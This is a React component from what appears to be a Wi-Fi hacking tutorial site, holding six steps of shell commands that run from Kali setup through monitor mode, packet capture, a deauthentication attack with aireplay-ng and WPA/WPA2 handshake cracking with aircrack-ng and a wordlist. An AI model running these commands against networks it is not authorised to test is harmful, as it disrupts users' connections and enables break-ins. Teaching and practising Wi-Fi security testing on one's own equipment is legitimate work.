
import React from 'react';
import TutorialCard from './TutorialCard';

const TutorialSection = () => {
  const tutorials = [
    {
      number: 1,
      title: "Setting up Kali Linux",
      description: "Kali Linux is the most popular penetration testing distribution used by security professionals. You can install it as a virtual machine using VirtualBox or VMware, or directly boot it from a USB drive.",
      code: "# Download Kali Linux ISO\n$ wget https://cdimage.kali.org/kali-2023.1/kali-linux-2023.1-installer-amd64.iso\n\n# Or create a bootable USB drive\n$ sudo dd if=kali-linux-2023.1-installer-amd64.iso of=/dev/sdX bs=4M status=progress"
    },
    {
      number: 2,
      title: "Choosing the right Wi-Fi adapter",
      description: "Not all Wi-Fi adapters support monitor mode and packet injection. For Wi-Fi hacking, you need a compatible adapter like the Alfa AWUS036ACH or the TP-Link TL-WN722N (v1 only).",
      code: "# Check if your adapter supports monitor mode\n$ iw list | grep -A 10 \"Supported interface modes:\"\n\n# For Raspberry Pi alternatives\n$ sudo apt-get install realtek-rtl88xxau-dkms"
    },
    {
      number: 3,
      title: "Enabling monitor mode",
      description: "Monitor mode allows your Wi-Fi card to monitor all wireless traffic without being associated with an access point. This is essential for capturing packets.",
      code: "# Check current network interfaces\n$ iwconfig\n\n# Kill processes that might interfere\n$ sudo airmon-ng check kill\n\n# Enable monitor mode\n$ sudo airmon-ng start wlan0\n\n# Verify monitor mode is enabled\n$ iwconfig"
    },
    {
      number: 4,
      title: "Capturing packets with airodump-ng",
      description: "Airodump-ng is used to capture packets from the Wi-Fi networks in range. It shows network information like SSID, BSSID, channel, and encryption type.",
      code: "# Scan for networks\n$ sudo airodump-ng wlan0mon\n\n# Target a specific network\n$ sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] wlan0mon"
    },
    {
      number: 5,
      title: "Deauth attack with aireplay-ng",
      description: "A deauthentication attack forces clients to disconnect from the target network. When they reconnect, we can capture the authentication handshake.",
      code: "# Perform deauth attack\n$ sudo aireplay-ng -0 10 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon\n\n# -0 means deauth attack\n# 10 is the number of deauth packets\n# -a is the access point MAC\n# -c is the client MAC"
    },
    {
      number: 6,
      title: "Cracking the password using aircrack-ng",
      description: "Once you have captured a WPA/WPA2 handshake, you can use aircrack-ng with a wordlist to attempt to crack the password through a dictionary attack.",
      code: "# Crack the password\n$ sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [TARGET_BSSID] [CAPTURE_FILE]"
    }
  ];

  return (
    <section id="tutorials" className="py-20">
      <div className="section-container">
        <div className="text-center mb-12">
          <h2 className="text-3xl md:text-4xl font-bold mb-4">Step-by-Step Tutorials</h2>
          <p className="text-gray-300 max-w-2xl mx-auto">
            Follow these detailed tutorials to understand the process of Wi-Fi security testing.
            Click on each step to expand the detailed instructions.
          </p>
          <div className="w-24 h-1 bg-hack-green mx-auto mt-4"></div>
        </div>
        
        <div className="max-w-4xl mx-auto">
          {tutorials.map((tutorial) => (
            <TutorialCard
              key={tutorial.number}
              number={tutorial.number}
              title={tutorial.title}
              description={tutorial.description}
              code={tutorial.code}
            />
          ))}
        </div>
      </div>
    </section>
  );
};

export default TutorialSection;
